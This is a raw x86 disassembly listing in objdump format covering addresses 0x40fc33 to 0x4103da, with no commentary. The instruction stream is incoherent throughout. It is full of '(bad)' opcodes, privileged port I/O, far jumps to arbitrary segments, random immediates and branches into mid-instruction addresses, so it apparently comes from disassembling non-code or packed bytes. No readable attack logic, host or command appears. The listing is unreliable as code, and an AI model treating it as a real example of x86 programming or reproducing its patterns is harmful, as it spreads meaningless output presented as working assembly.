  40fc33:	bound  edx,QWORD PTR [edx]
  40fc35:	clc    
  40fc36:	cmp    al,0x47
  40fc38:	in     al,0xcd
  40fc3a:	retf   
  40fc3b:	ds std 
  40fc3d:	stos   DWORD PTR es:[edi],eax
  40fc3e:	sahf   
  40fc3f:	int3   
  40fc40:	and    eax,0x24c9ab5b
  40fc45:	inc    esi
  40fc46:	cmp    dh,dh
  40fc48:	shr    DWORD PTR [esi+0x27614e9f],1
  40fc4e:	adc    al,0x9f
  40fc50:	xchg   ecx,eax
  40fc51:	cwde   
  40fc52:	mov    WORD PTR [ebx+ebx*8-0x6],?
  40fc56:	jne    0x40fc7b
  40fc58:	scas   eax,DWORD PTR es:[edi]
  40fc59:	iret   
  40fc5a:	sti    
  40fc5b:	fs add esi,ebp
  40fc5e:	xchg   esp,eax
  40fc5f:	popf   
  40fc60:	js     0x40fc59
  40fc62:	mov    edi,0xa3e278e4
  40fc67:	push   ebp
  40fc68:	mov    ebx,0x15d5614b
  40fc6d:	adc    esp,ecx
  40fc6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc70:	xchg   ebp,eax
  40fc71:	jge    0x40fca1
  40fc73:	jge    0x40fc9c
  40fc75:	mov    esi,0x6e20f263
  40fc7a:	dec    ebp
  40fc7b:	daa    
  40fc7c:	lods   eax,DWORD PTR ds:[esi]
  40fc7d:	and    dh,bh
  40fc7f:	mov    ah,0xa3
  40fc81:	test   al,0xf5
  40fc83:	adc    bh,BYTE PTR [edx+0x11]
  40fc86:	retf   
  40fc87:	inc    ecx
  40fc88:	int3   
  40fc89:	loopne 0x40fc87
  40fc8b:	retf   0xc8ca
  40fc8e:	and    bl,BYTE PTR [ecx-0x33cd81e9]
  40fc94:	push   ebp
  40fc95:	out    0x66,eax
  40fc97:	je     0x40fd11
  40fc99:	jno    0x40fcce
  40fc9b:	xor    eax,0xb796fb1c
  40fca0:	xchg   BYTE PTR ds:[edx+0x2c28953c],cl
  40fca7:	dec    ebp
  40fca8:	das    
  40fca9:	inc    edx
  40fcaa:	or     BYTE PTR [ecx],0x6b
  40fcad:	mov    bl,0x57
  40fcaf:	or     edi,DWORD PTR [eax+0x7e]
  40fcb2:	leave  
  40fcb3:	sub    al,0x7b
  40fcb5:	ror    BYTE PTR [ecx],0xb4
  40fcb8:	aaa    
  40fcb9:	jbe    0x40fd17
  40fcbb:	retf   
  40fcbc:	les    ebx,FWORD PTR [ebp+esi*8+0x2a960a4]
  40fcc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fcc4:	(bad)  
  40fcc5:	push   edx
  40fcc6:	mov    ecx,fs
  40fcc8:	push   cs
  40fcc9:	sub    ecx,DWORD PTR [ebx-0x15d33cd1]
  40fccf:	xchg   edx,eax
  40fcd0:	aad    0x3
  40fcd2:	and    eax,0xd8dedb2a
  40fcd7:	andnps xmm6,XMMWORD PTR [eax-0x3b8b3c6b]
  40fcde:	mov    ch,0x5d
  40fce0:	into   
  40fce1:	jge    0x40fd0d
  40fce3:	mov    al,ds:0x6901fe5e
  40fce8:	mov    edx,0x3cd1f555
  40fced:	push   ss
  40fcee:	cli    
  40fcef:	call   0x6b3e:0x5d56f8ab
  40fcf6:	cs aaa 
  40fcf8:	loop   0x40fd75
  40fcfa:	pop    edi
  40fcfb:	lds    ecx,FWORD PTR [ecx+0xf]
  40fcfe:	test   eax,0xb3cad74f
  40fd03:	or     BYTE PTR [edi],ch
  40fd05:	fwait
  40fd06:	inc    esp
  40fd07:	adc    al,0xae
  40fd09:	mov    ds:0x47766d75,al
  40fd0e:	mov    eax,0x4db8d23e
  40fd13:	enter  0x334d,0xcd
  40fd17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd18:	add    ebp,ebx
  40fd1a:	adc    ebp,edx
  40fd1c:	xchg   BYTE PTR [ebp-0x28],bl
  40fd1f:	inc    edi
  40fd20:	in     al,dx
  40fd21:	mov    al,ds:0xd0c9a867
  40fd26:	adc    esi,edx
  40fd28:	add    eax,DWORD PTR [esi+0x26910f11]
  40fd2e:	xchg   ecx,eax
  40fd2f:	sahf   
  40fd30:	sub    DWORD PTR [edi+edx*4],esp
  40fd33:	xchg   ecx,eax
  40fd34:	mov    BYTE PTR [edi-0x5fa1e45c],dl
  40fd3a:	jbe    0x40fd94
  40fd3c:	pop    edi
  40fd3d:	(bad)  [ebp+0x1]
  40fd40:	out    0x9f,al
  40fd42:	retf   
  40fd43:	inc    eax
  40fd44:	mov    ds:0x24cadc35,al
  40fd49:	out    dx,eax
  40fd4a:	dec    ebp
  40fd4b:	into   
  40fd4c:	hlt    
  40fd4d:	aam    0x83
  40fd4f:	xchg   DWORD PTR [ebp-0x39],ebp
  40fd52:	cmp    BYTE PTR [edx],ah
  40fd54:	push   cs
  40fd55:	pushf  
  40fd56:	push   0xdcf5bde7
  40fd5b:	in     eax,dx
  40fd5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd5e:	sbb    bl,BYTE PTR [edx]
  40fd60:	adc    eax,0x4b58da69
  40fd65:	jae    0x40fda4
  40fd67:	inc    esp
  40fd68:	stos   BYTE PTR es:[edi],al
  40fd69:	test   al,0x1d
  40fd6b:	popf   
  40fd6c:	je     0x40fda2
  40fd6e:	(bad)  
  40fd6f:	pop    ecx
  40fd70:	mov    WORD PTR es:[eax+0x3],ss
  40fd74:	cwde   
  40fd75:	retf   0x690b
  40fd78:	test   al,ah
  40fd7a:	inc    ebp
  40fd7b:	xchg   ebx,eax
  40fd7c:	jp     0x40fd25
  40fd7e:	pop    ecx
  40fd7f:	mov    bl,0x59
  40fd81:	aas    
  40fd82:	jg     0x40fdd0
  40fd84:	xor    DWORD PTR [eax+0x5d],ebx
  40fd87:	(bad)  
  40fd88:	push   eax
  40fd89:	neg    ebx
  40fd8b:	test   eax,0xa87a2fde
  40fd90:	iret   
  40fd91:	mov    ah,0x63
  40fd93:	jno    0x40fd59
  40fd95:	dec    ebx
  40fd96:	fsubr  DWORD PTR [edx+0x766d3e07]
  40fd9c:	xor    eax,0x41f064df
  40fda1:	clc    
  40fda2:	xchg   ecx,eax
  40fda3:	dec    ebp
  40fda4:	and    ecx,esi
  40fda6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fda7:	scas   eax,DWORD PTR es:[edi]
  40fda8:	mov    dl,0xb2
  40fdaa:	lahf   
  40fdab:	loop   0x40fd58
  40fdad:	shl    bh,0x78
  40fdb0:	fst    QWORD PTR [edx-0x49]
  40fdb3:	mov    dl,0x13
  40fdb5:	mov    al,ds:0x3d304348
  40fdba:	push   esi
  40fdbb:	add    dl,cl
  40fdbd:	push   eax
  40fdbe:	lahf   
  40fdbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fdc0:	mov    ?,esi
  40fdc2:	fstp   TBYTE PTR [edi+0x13]
  40fdc5:	fimul  DWORD PTR [ebp+edx*8-0x1c]
  40fdc9:	sti    
  40fdca:	je     0x40fd4c
  40fdcc:	jmp    0x76f0:0x125cb6b
  40fdd3:	stos   DWORD PTR es:[edi],eax
  40fdd4:	jno    0x40fd8f
  40fdd6:	rcr    DWORD PTR [esi+0x43fb4539],1
  40fddc:	jne    0x40fe0c
  40fdde:	ja     0x40fdc3
  40fde0:	test   DWORD PTR [edi+ecx*4-0x4e88fe05],ebp
  40fde7:	mov    cl,dh
  40fde9:	daa    
  40fdea:	stc    
  40fdeb:	out    0x7,al
  40fded:	adc    BYTE PTR [ecx+esi*8-0x4f006a70],ch
  40fdf4:	dec    edx
  40fdf5:	mov    ebx,0xd6c21b25
  40fdfa:	int    0x37
  40fdfc:	pop    esp
  40fdfd:	lea    eax,[edx-0x37a57b90]
  40fe03:	jmp    0x40fdc1
  40fe05:	test   eax,0x18a8e0ab
  40fe0a:	out    0x47,al
  40fe0c:	mov    ch,0x46
  40fe0e:	jb     0x40fd97
  40fe10:	xor    DWORD PTR [ecx-0x2128cbd],ecx
  40fe16:	call   0xca76120b
  40fe1b:	in     eax,dx
  40fe1c:	in     al,0x50
  40fe1e:	ins    BYTE PTR es:[edi],dx
  40fe1f:	inc    esp
  40fe20:	scas   eax,DWORD PTR es:[edi]
  40fe21:	outs   dx,DWORD PTR ds:[esi]
  40fe22:	or     eax,0xe2bcef8c
  40fe27:	in     al,dx
  40fe28:	mov    cl,0xfa
  40fe2a:	dec    edx
  40fe2b:	nop
  40fe2c:	ins    DWORD PTR es:[edi],dx
  40fe2d:	dec    edi
  40fe2e:	in     al,dx
  40fe2f:	adc    BYTE PTR [ecx-0x71],bh
  40fe32:	jmp    0x27ec:0x9adf892e
  40fe39:	add    DWORD PTR [ebx+edx*4-0x2590f923],esp
  40fe40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe41:	push   0x31e70ac6
  40fe46:	adc    DWORD PTR [esi+0x1721d6d4],edi
  40fe4c:	dec    ebp
  40fe4d:	iret   
  40fe4e:	aaa    
  40fe4f:	inc    edx
  40fe50:	scas   al,BYTE PTR es:[edi]
  40fe51:	inc    ebp
  40fe52:	sbb    BYTE PTR [ebp-0x40285546],bl
  40fe58:	sar    DWORD PTR [esi+ebx*2-0x80],1
  40fe5c:	or     BYTE PTR [edx],cl
  40fe5e:	jle    0x40fdf4
  40fe60:	and    DWORD PTR [edi+eiz*4],esi
  40fe63:	repnz aad 0xea
  40fe66:	nop
  40fe67:	xchg   edi,eax
  40fe68:	mov    al,ds:0x4af4f63c
  40fe6d:	dec    edx
  40fe6e:	in     eax,dx
  40fe6f:	dec    ebx
  40fe70:	dec    edx
  40fe71:	dec    esi
  40fe72:	jl     0x40fea8
  40fe74:	sub    eax,esp
  40fe76:	in     eax,dx
  40fe77:	inc    esi
  40fe78:	push   esi
  40fe79:	ins    BYTE PTR es:[edi],dx
  40fe7a:	or     bl,BYTE PTR [esi]
  40fe7c:	test   eax,0x4f346d5
  40fe81:	cmp    ebx,DWORD PTR [eax-0x7f]
  40fe84:	mov    ebp,0x53d4955a
  40fe89:	test   al,0xf7
  40fe8b:	call   0x480cafbb
  40fe90:	add    al,0xc8
  40fe92:	leave  
  40fe93:	add    DWORD PTR ds:0x81a06495,eax
  40fe99:	lock xor DWORD PTR [esi+0x2edde00d],edx
  40fea0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fea1:	cmc    
  40fea2:	sub    DWORD PTR [esi],ebp
  40fea4:	xchg   edx,eax
  40fea5:	loopne 0x40fe5d
  40fea7:	xlat   BYTE PTR ds:[ebx]
  40fea8:	aad    0xa1
  40feaa:	mov    edx,0x44a2ee8c
  40feaf:	leave  
  40feb0:	pusha  
  40feb1:	(bad)  ds:0x60a876d4
  40feb7:	xor    BYTE PTR [esp+ecx*8-0x2a2e2880],cl
  40febe:	cmp    cl,ch
  40fec0:	push   ebp
  40fec1:	cdq    
  40fec2:	lock pop ds
  40fec4:	repnz (bad) 
  40fec7:	leave  
  40fec8:	in     eax,0x70
  40feca:	dec    edi
  40fecb:	in     eax,0xd5
  40fecd:	pop    ebx
  40fece:	fwait
  40fecf:	sub    ebp,esp
  40fed1:	and    eax,0xf1ebf013
  40fed6:	jb     0x40ff2d
  40fed8:	pusha  
  40fed9:	out    0x22,al
  40fedb:	aad    0x64
  40fedd:	jo     0x40fed2
  40fedf:	sub    ecx,DWORD PTR [edi]
  40fee1:	cwde   
  40fee2:	mov    ebp,0x19cddd53
  40fee7:	xchg   edi,eax
  40fee8:	lods   eax,DWORD PTR ds:[esi]
  40fee9:	add    bh,0xf0
  40feec:	loop   0x40ff4d
  40feee:	cmp    edx,DWORD PTR [ebx+0x41]
  40fef1:	imul   edx,ebp,0x10efa07
  40fef7:	loope  0x40ff5d
  40fef9:	aas    
  40fefa:	jmp    0x40fec7
  40fefc:	cwde   
  40fefd:	out    dx,al
  40fefe:	push   edx
  40feff:	fwait
  40ff00:	shr    BYTE PTR [ebp-0x22914b53],1
  40ff06:	cmp    ebp,DWORD PTR [ebp-0x1749441]
  40ff0c:	dec    edi
  40ff0d:	and    DWORD PTR [edx],eax
  40ff0f:	jae    0x40ff6f
  40ff11:	mov    dh,0xed
  40ff13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff14:	xor    bl,dh
  40ff16:	mov    edi,0xeb215bcf
  40ff1b:	jne    0x40ff5b
  40ff1d:	and    DWORD PTR [edi],ebx
  40ff1f:	push   0x6db6c038
  40ff24:	mov    esp,0xa9526bc9
  40ff29:	sbb    al,0x16
  40ff2b:	in     eax,dx
  40ff2c:	inc    ecx
  40ff2d:	xchg   ebp,eax
  40ff2e:	daa    
  40ff2f:	call   0x8f6e:0xf21ddc38
  40ff36:	in     eax,dx
  40ff37:	mov    al,0xb0
  40ff39:	dec    ebx
  40ff3a:	data16 ja 0x40ff7c
  40ff3d:	fisttp DWORD PTR [ebp+0x45bac760]
  40ff43:	push   0xffffff9e
  40ff45:	xor    al,0xa
  40ff47:	in     al,dx
  40ff48:	retf   0xfb1
  40ff4b:	sbb    BYTE PTR [esi-0x16],ah
  40ff4e:	pop    edi
  40ff4f:	or     DWORD PTR [esi+0x32aa0a0f],esp
  40ff55:	rcl    BYTE PTR [edx],cl
  40ff57:	mov    dl,0x4f
  40ff59:	es pop esi
  40ff5b:	jnp    0x40ff08
  40ff5d:	xor    al,0xfc
  40ff5f:	stos   BYTE PTR es:[edi],al
  40ff60:	add    BYTE PTR [eax],bh
  40ff62:	repz or eax,0x40cfc0ce
  40ff68:	adc    BYTE PTR [edx+eax*2+0x56],ch
  40ff6c:	mov    edi,0xa9fa5540
  40ff71:	dec    edx
  40ff72:	sar    ecx,1
  40ff74:	pop    edi
  40ff75:	outs   dx,BYTE PTR ds:[esi]
  40ff76:	mov    esi,0x98fa9f
  40ff7b:	sbb    esp,ecx
  40ff7d:	mov    al,ds:0x58ca215d
  40ff82:	and    DWORD PTR [eax+0x39645f29],edx
  40ff88:	or     BYTE PTR [edx+0x5d6eed2a],0x86
  40ff8f:	and    eax,0xfccbb19c
  40ff94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff95:	ds xchg ecx,eax
  40ff97:	jno    0x40ff8a
  40ff99:	iret   
  40ff9a:	daa    
  40ff9b:	je     0x40ffed
  40ff9d:	sub    DWORD PTR [ecx+0x47],0xf7518c9b
  40ffa4:	or     bl,BYTE PTR [esp+ebp*1]
  40ffa7:	ins    BYTE PTR es:[edi],dx
  40ffa8:	sahf   
  40ffa9:	dec    edi
  40ffaa:	sub    dl,BYTE PTR ds:0x82c985a9
  40ffb0:	out    0xf,eax
  40ffb2:	mul    DWORD PTR [ebx]
  40ffb4:	push   eax
  40ffb5:	jge    0x40ff4b
  40ffb7:	out    0x37,al
  40ffb9:	jnp    0x410020
  40ffbb:	add    eax,0x4079a451
  40ffc0:	mov    edi,esi
  40ffc2:	clc    
  40ffc3:	xchg   edx,eax
  40ffc4:	cdq    
  40ffc5:	mov    ds:0x43b68411,al
  40ffca:	xchg   ebp,eax
  40ffcb:	clc    
  40ffcc:	or     eax,0xeee9216f
  40ffd1:	jmp    0x1622e9a0
  40ffd6:	add    dh,ch
  40ffd8:	test   al,0xc7
  40ffda:	lods   eax,DWORD PTR ds:[esi]
  40ffdb:	pop    eax
  40ffdc:	fisubr WORD PTR [ebp+0x3704847e]
  40ffe2:	test   al,0x90
  40ffe4:	sub    esi,edx
  40ffe6:	popa   
  40ffe7:	adc    bl,ch
  40ffe9:	sbb    eax,0x7adb727f
  40ffee:	sti    
  40ffef:	adc    al,0xf8
  40fff1:	sbb    eax,0x802b78db
  40fff6:	test   al,0x80
  40fff8:	inc    edx
  40fff9:	das    
  40fffa:	mov    esi,0x5b248ee8
  40ffff:	pop    es
  410000:	dec    edi
  410001:	repz leave 
  410003:	dec    ecx
  410004:	cmp    edi,0xffffffe9
  410007:	out    0x68,al
  410009:	inc    edi
  41000a:	and    DWORD PTR [eax],ecx
  41000c:	pop    DWORD PTR [edx]
  41000e:	mov    al,ds:0x1c206f4
  410013:	or     BYTE PTR [esi+ecx*4+0x5f],0x9f
  410018:	dec    esi
  410019:	retf   0x67c
  41001c:	(bad)
  410020:	sub    eax,esp
  410022:	sbb    ch,dl
  410024:	std    
  410025:	out    dx,al
  410026:	ret    
  410027:	mov    ah,0x19
  410029:	in     al,dx
  41002a:	add    BYTE PTR [ecx-0x6d],0x2
  41002e:	dec    ebx
  41002f:	loope  0x40ffd3
  410031:	sub    dl,BYTE PTR [ecx+0xa]
  410034:	neg    DWORD PTR [ebx-0x1b]
  410037:	stos   BYTE PTR es:[edi],al
  410038:	push   0x5b4b81c7
  41003d:	ffree  st(0)
  41003f:	xor    ecx,DWORD PTR [edx]
  410041:	push   ds
  410042:	call   0x6d6a5c60
  410047:	(bad)  
  410048:	ds nop
  41004a:	sbb    BYTE PTR cs:[edx-0x47],0x9f
  41004f:	and    ax,0xc54f
  410053:	dec    edx
  410054:	scas   eax,DWORD PTR es:[edi]
  410055:	(bad)  
  410056:	mov    al,dh
  410058:	sub    eax,DWORD PTR [ebx]
  41005a:	sub    DWORD PTR [ecx],0x1774da78
  410060:	or     dl,BYTE PTR [eiz*2+0x85248b4]
  410067:	sbb    DWORD PTR [ecx],edx
  410069:	and    dl,BYTE PTR [ebp+0x590079fd]
  41006f:	jp     0x410088
  410071:	iret   
  410072:	cwde   
  410073:	jae    0x41008e
  410075:	fwait
  410076:	mov    ds:0x4bb0b552,eax
  41007b:	add    al,0x2c
  41007d:	xor    eax,0x9c42e4a0
  410082:	dec    edi
  410083:	xchg   esi,eax
  410084:	jno    0x4100a9
  410086:	fisub  DWORD PTR [ecx]
  410088:	sub    ecx,DWORD PTR [ebx]
  41008a:	xchg   esp,eax
  41008b:	and    al,0xdd
  41008d:	leave  
  41008e:	push   ss
  41008f:	xchg   dh,ah
  410091:	sbb    eax,0x84551a94
  410096:	js     0x41003d
  410098:	mov    ah,0x29
  41009a:	ja     0x410094
  41009c:	js     0x4100ad
  41009e:	fwait
  41009f:	call   0x670b:0x87edd482
  4100a6:	xchg   ebx,eax
  4100a7:	adc    esi,DWORD PTR [edi+0x2d]
  4100aa:	pop    edx
  4100ab:	and    eax,0xde4c4e54
  4100b0:	data16 (bad) 
  4100b2:	test   al,0x41
  4100b4:	and    al,0xa3
  4100b6:	dec    esp
  4100b7:	mov    esp,0x73d055bd
  4100bc:	shl    BYTE PTR [ecx],cl
  4100be:	sub    ah,BYTE PTR [edi+0x2b]
  4100c1:	or     eax,0x4d3c59b5
  4100c6:	mov    ds:0x397ec2e8,al
  4100cb:	push   esp
  4100cc:	fwait
  4100cd:	sbb    al,0xbf
  4100cf:	out    dx,eax
  4100d0:	hlt    
  4100d1:	and    dh,BYTE PTR [edx+0x45dc3b35]
  4100d7:	aas    
  4100d8:	mov    edi,0xd5fc1f62
  4100dd:	pop    esi
  4100de:	and    DWORD PTR [eax-0x57],0xffffffb2
  4100e2:	mov    esi,0x6539208
  4100e7:	mov    bh,0x95
  4100e9:	into   
  4100ea:	je     0x410160
  4100ec:	xchg   edi,eax
  4100ed:	sahf   
  4100ee:	test   DWORD PTR [edi],0x4514dbea
  4100f4:	outs   dx,BYTE PTR ds:[esi]
  4100f5:	pop    esi
  4100f6:	(bad)  
  4100f7:	mov    bh,0xb3
  4100f9:	out    dx,eax
  4100fa:	xchg   edi,eax
  4100fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100fc:	(bad)
  4100ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410100:	push   esp
  410101:	mov    dl,0x80
  410103:	ja     0x41017d
  410105:	cmc    
  410106:	mov    eax,ds:0xe2cd6f01
  41010b:	mov    ebx,0x1d27484f
  410110:	mov    es:0xc6ce03cb,al
  410116:	or     DWORD PTR [esi],esi
  410118:	push   ss
  410119:	sub    eax,0xfb70c19d
  41011e:	push   ss
  41011f:	fnstsw WORD PTR [ecx+0x47fd2784]
  410125:	mov    ah,0xe5
  410127:	sbb    bh,al
  410129:	inc    ebx
  41012a:	lahf   
  41012b:	(bad)  
  41012d:	pop    ss
  41012e:	(bad)  
  41012f:	out    dx,al
  410130:	(bad)  
  410131:	daa    
  410132:	push   eax
  410133:	mov    ch,0xae
  410135:	rcr    DWORD PTR [ebp-0x520beb07],1
  41013b:	imul   edi,ecx,0xffffffbb
  41013e:	or     ch,bh
  410140:	add    BYTE PTR [ebx+ecx*8],ah
  410143:	fistp  QWORD PTR [ecx+esi*8+0x79e2cfb6]
  41014a:	xor    al,dh
  41014c:	mov    ds:0x77ddff18,eax
  410151:	lock cmp al,0x2
  410154:	pop    edx
  410155:	aaa    
  410156:	sub    esp,DWORD PTR ds:0xe66cc3cf
  41015c:	imul   DWORD PTR [esi]
  41015e:	dec    ecx
  41015f:	mov    bl,0x4d
  410161:	mov    ecx,0xc227b09
  410166:	adc    al,0x69
  410168:	clc    
  410169:	ss add al,0x82
  41016c:	add    eax,0x7ca3d669
  410171:	add    ecx,edi
  410173:	aaa    
  410174:	repnz inc edx
  410176:	cmp    ecx,ebp
  410178:	call   0x5abb:0x1293c749
  41017f:	or     al,0x66
  410181:	test   eax,0xa004c980
  410186:	jle    0x410148
  410188:	or     al,0xb4
  41018a:	sbb    al,0x84
  41018c:	std    
  41018d:	xchg   ebx,eax
  41018e:	dec    ebx
  41018f:	mov    eax,0x7e56d4a9
  410194:	xor    dl,BYTE PTR [ebx+0x138c11f8]
  41019a:	test   DWORD PTR [ebx-0x28a61adb],esi
  4101a0:	inc    eax
  4101a1:	sar    ebp,cl
  4101a3:	adc    dl,BYTE PTR [ebx]
  4101a5:	adc    BYTE PTR [ecx],al
  4101a7:	mov    DWORD PTR [edx+ebp*4],ebx
  4101aa:	sbb    eax,0xd72f234
  4101af:	sbb    ch,BYTE PTR fs:[ecx-0xf14d901]
  4101b6:	pop    eax
  4101b7:	xchg   BYTE PTR [edi],dl
  4101b9:	std    
  4101ba:	add    eax,0x998c6695
  4101bf:	cli    
  4101c0:	dec    edi
  4101c1:	pop    edi
  4101c2:	sbb    ecx,0x66
  4101c5:	out    0x47,al
  4101c7:	cmp    BYTE PTR [esi+0x442d08be],bh
  4101cd:	pop    esi
  4101ce:	gs jae 0x4101fe
  4101d1:	scas   eax,DWORD PTR es:[edi]
  4101d2:	cmp    ecx,edx
  4101d4:	xchg   edi,eax
  4101d5:	push   cs
  4101d6:	xlat   BYTE PTR ds:[ebx]
  4101d7:	mov    ebx,0x1d883b67
  4101dc:	mov    eax,ds:0xa937c252
  4101e1:	sub    DWORD PTR [ebp+0x4596408e],0xe42a348
  4101eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101ec:	test   eax,0xa6be5870
  4101f1:	mov    ds:0x61a820e,eax
  4101f6:	cs cld 
  4101f8:	cli    
  4101f9:	dec    edx
  4101fa:	rol    BYTE PTR [ebx-0x577c3ade],0x3
  410201:	sbb    al,0x16
  410203:	and    ah,0xa8
  410206:	(bad)  [edx+0x30]
  410209:	or     al,0x30
  41020b:	xchg   DWORD PTR [ebp+0x5f29b30f],ecx
  410211:	push   ecx
  410212:	retf   
  410213:	inc    edi
  410214:	test   BYTE PTR [edi+0x6610d7c5],ch
  41021a:	js     0x410258
  41021c:	adc    eax,0x4d43729b
  410221:	outs   dx,BYTE PTR ds:[esi]
  410222:	jbe    0x410235
  410224:	imul   eax,ebx,0x4
  410227:	inc    ebp
  410228:	or     DWORD PTR [ecx],ebp
  41022a:	inc    ebp
  41022b:	pop    ecx
  41022c:	call   0xb0d97898
  410231:	ins    BYTE PTR es:[edi],dx
  410232:	test   ecx,esp
  410234:	cmp    ebx,edi
  410236:	adc    ch,BYTE PTR [ecx]
  410238:	jo     0x4101cb
  41023a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41023b:	shr    BYTE PTR [edi+0x57cc08cf],1
  410241:	and    ebp,esp
  410243:	lock (bad) 
  410246:	rcr    BYTE PTR [ebx+0x70a17cc5],1
  41024c:	adc    DWORD PTR [edi-0x17f7d648],0xffffffdc
  410253:	pop    eax
  410254:	push   esp
  410255:	xchg   esi,eax
  410256:	mov    fs,ecx
  410258:	xchg   esp,eax
  410259:	sub    al,BYTE PTR [edi-0x3b]
  41025c:	cs jmp 0xe5feaf14
  410262:	xor    ebx,DWORD PTR [esi]
  410264:	push   eax
  410265:	and    al,0xbf
  410267:	addr16 repz push eax
  41026a:	jge    0x4102bd
  41026c:	sub    DWORD PTR [eax+0x56],ebx
  41026f:	pop    esi
  410270:	out    0xa7,eax
  410272:	jbe    0x4102f2
  410274:	or     cl,BYTE PTR [edx]
  410276:	mov    WORD PTR [esi+0x5],fs
  410279:	stc    
  41027a:	pop    ecx
  41027b:	jae    0x410235
  41027d:	jnp    0x410252
  41027f:	inc    edx
  410280:	lock sbb BYTE PTR [esi+0x2e],dl
  410284:	and    esp,ebx
  410286:	inc    edx
  410287:	stos   BYTE PTR es:[edi],al
  410288:	std    
  410289:	(bad)  
  41028a:	pop    esp
  41028b:	push   cs
  41028c:	iret   
  41028d:	rol    DWORD PTR [ebx-0x6a3ac3aa],cl
  410293:	mov    esp,0x72c4ba13
  410298:	clc    
  410299:	mov    dh,0xe2
  41029b:	mov    ds:0xb0df85c5,al
  4102a0:	mov    eax,ds:0xb7ea426e
  4102a5:	adc    DWORD PTR [bx+si],ebp
  4102a8:	(bad)  
  4102a9:	mov    dh,0x70
  4102ab:	addr16 gs inc ebp
  4102ae:	adc    eax,0xfb98bd62
  4102b3:	daa    
  4102b4:	scas   al,BYTE PTR es:[edi]
  4102b5:	pop    ebx
  4102b6:	jmp    0xe21f:0xf7d033b1
  4102bd:	(bad)  
  4102be:	fist   DWORD PTR [esi]
  4102c0:	sub    al,0xfd
  4102c2:	mov    al,0x89
  4102c4:	test   al,0x4
  4102c6:	inc    ecx
  4102c7:	sub    eax,0x329f6f30
  4102cc:	adc    eax,0xfa057a3b
  4102d1:	pop    edx
  4102d2:	jno    0x410259
  4102d4:	mov    ds:0x698d79f1,al
  4102d9:	jge    0x410271
  4102db:	push   ds
  4102dc:	mov    al,ds:0x99baa2f2
  4102e1:	scas   al,BYTE PTR es:[edi]
  4102e2:	sar    DWORD PTR [eax],1
  4102e4:	mov    cl,0xb8
  4102e6:	int    0x3b
  4102e8:	pop    ebp
  4102e9:	jmp    0x6becaf54
  4102ee:	mov    esp,0xd9746d69
  4102f3:	popf   
  4102f4:	xlat   BYTE PTR ds:[ebx]
  4102f5:	mov    ecx,DWORD PTR [edx]
  4102f7:	sar    ah,cl
  4102f9:	jmp    0xcc9f611c
  4102fe:	fst    QWORD PTR [ebx+ebp*8-0x71]
  410302:	jne    0x41032b
  410304:	xchg   DWORD PTR ds:[esi-0x56],ebx
  410308:	std    
  410309:	test   BYTE PTR [ecx+0x4d7efcfd],dh
  41030f:	ds imul eax,esp,0x8faf6ae8
  410316:	cmp    ch,ch
  410318:	idiv   BYTE PTR [ecx+0x22cd6a84]
  41031e:	rol    bl,0x62
  410321:	xchg   ebx,eax
  410322:	cwde   
  410323:	(bad)  
  410324:	xor    BYTE PTR [eax],ah
  410326:	xor    bh,BYTE PTR [eax-0x32]
  410329:	es in  eax,dx
  41032b:	mov    al,0x31
  41032d:	inc    edx
  41032e:	nop
  41032f:	adc    eax,0xd61fbf79
  410334:	cs mov bl,0xd0
  410337:	jl     0x410370
  410339:	daa    
  41033a:	iret   
  41033b:	dec    ebp
  41033c:	xrstors [edi+0x3]
  410340:	pop    edi
  410341:	adc    dh,BYTE PTR [edx+eax*4-0x38]
  410345:	std    
  410346:	xor    dh,BYTE PTR [ebx-0x6e017d53]
  41034c:	imul   eax,DWORD PTR [ecx],0x69
  41034f:	jp     0x41032d
  410351:	jnp    0x4103c2
  410353:	mov    ebx,0xa5cf6c92
  410358:	and    eax,0x19c2e7d3
  41035d:	lahf   
  41035e:	(bad)  
  41035f:	xchg   DWORD PTR [edi+ebp*8+0x10f91a24],esp
  410366:	xchg   ecx,eax
  410367:	or     eax,0x926985c7
  41036c:	iret   
  41036d:	dec    edx
  41036e:	imul   edx,DWORD PTR [edi],0xbfe2054b
  410374:	xchg   ebp,eax
  410375:	out    0x81,al
  410377:	aad    0x9b
  410379:	sub    ah,dh
  41037b:	adc    BYTE PTR [eax],ch
  41037d:	or     edx,edx
  41037f:	mov    edi,0x5f4af991
  410384:	ret    0xbec8
  410387:	cmp    eax,0xd35edaf3
  41038c:	addr16 dec edi
  41038e:	adc    bl,al
  410390:	mov    esp,0x793829c
  410395:	out    0x9a,al
  410397:	dec    esp
  410398:	stos   BYTE PTR es:[edi],al
  410399:	retf   
  41039a:	mov    edx,0x980ed886
  41039f:	scas   eax,DWORD PTR es:[edi]
  4103a0:	nop
  4103a1:	add    BYTE PTR [edx-0x37205a5a],0x5b
  4103a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4103a9:	dec    edx
  4103aa:	mov    al,ds:0xe605a931
  4103af:	scas   eax,DWORD PTR es:[edi]
  4103b0:	pusha  
  4103b1:	mov    ecx,0x3b3f073d
  4103b6:	inc    esi
  4103b7:	popa   
  4103b8:	push   ecx
  4103b9:	mov    ebp,0xc2b67b9e
  4103be:	imul   ebx,DWORD PTR [edi+0x7aee4d04],0xb40a9cc1
  4103c8:	mov    ebx,0x6949f51d
  4103cd:	iret   
  4103ce:	into   
  4103cf:	xchg   ecx,eax
  4103d0:	push   eax
  4103d1:	pop    ebp
  4103d2:	pop    esp
  4103d3:	mov    es,ebp
  4103d5:	arpl   di,si
  4103d7:	shl    DWORD PTR [edi-0x6d],1
  4103da:	and    eax,ebp
